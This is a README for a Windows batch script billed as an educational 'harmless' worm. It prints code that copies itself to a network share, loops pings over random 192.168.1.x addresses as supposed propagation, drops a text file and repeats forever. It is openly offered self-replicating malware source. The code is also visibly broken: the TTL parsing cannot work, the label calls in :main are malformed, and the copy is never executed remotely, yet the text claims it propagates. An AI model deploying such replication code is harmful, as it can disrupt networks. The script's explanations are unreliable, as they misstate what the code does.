
# 🪱 Harmless-Worm

A proof-of-concept batch script simulating basic worm-like behavior on Windows systems. It is designed for **educational** and **research** purposes only.

> ⚠️ **DISCLAIMER:**  
> This script demonstrates potentially malicious behavior, including self-replication and unauthorized propagation. It should **only** be executed in a secure, isolated environment (e.g., a virtual machine or test lab). **Do not run this on a production system or network.**

---

## 📜 What It Does

The script is a simplistic Windows batch worm that:

1. **Self-replicates** to a predefined shared folder on a target machine.
2. **Attempts propagation** by scanning for machines in the same subnet.
3. **Creates a harmless file** on the host machine to simulate payload activity.
4. **Runs in an infinite loop**, continuing propagation and payload simulation.

---

## 🔍 Breakdown of the Script

```batch
@echo off
setlocal
```
Suppresses command output and starts a local environment for variables.

---

### 🧬 :copy_worm
```batch
:copy_worm
copy %0 \\target_machine\shared_folder /y
```
Copies the current script (`%0`) to a network shared folder (`\\target_machine\shared_folder`).

---

### 🧪 :run_worm
```batch
:run_worm
ping 127.0.0.1 -n 1 >nul
for /f "tokens=1 delims=:" %%i in ('ping -n 1 -l 1 %computername% ^| find "TTL="') do set ttl=%%i
set /a ttl-=1
for /l %%i in (1,1,%ttl%) do (
    for /f "tokens=1 delims=:" %%j in ('ping -n 1 -l %%i 192.168.1.%random% ^| find "TTL="') do set ttl=%%j
    if %ttl% gtr 0 goto :run_worm
)
```
- Extracts TTL (Time To Live) value from ping response.
- Uses the TTL value to estimate nearby reachable machines.
- Attempts to ping randomized IPs in the `192.168.1.x` subnet.
- If another system responds, it attempts to propagate again.

---

### 🔁 :main
```batch
:main
echo Harmless text file created by worm > C:\harmless_file.txt
copy_worm
run_worm
goto main
```
Simulates a payload by creating a harmless text file and repeatedly attempts self-copying and propagation in an infinite loop.

---

## 🛡️ Security Implications

This script mirrors real-world worm behaviors like:
- **Self-replication**
- **Autonomous spreading**
- **Looped execution with minimal logic**

It does **not** carry a destructive payload, but its behavior could disrupt networks or systems if misused.

---

## 🧪 Use Case

For learning purposes, red-team labs, or demonstrations on:
- Worm propagation logic
- Windows batch scripting capabilities
- Network response evaluation using `ping` and TTL

---

## 📁 Notes

- Replace `\\target_machine\shared_folder` with a valid writable network path for actual testing.
- Ensure test environments are **air-gapped** and non-critical.
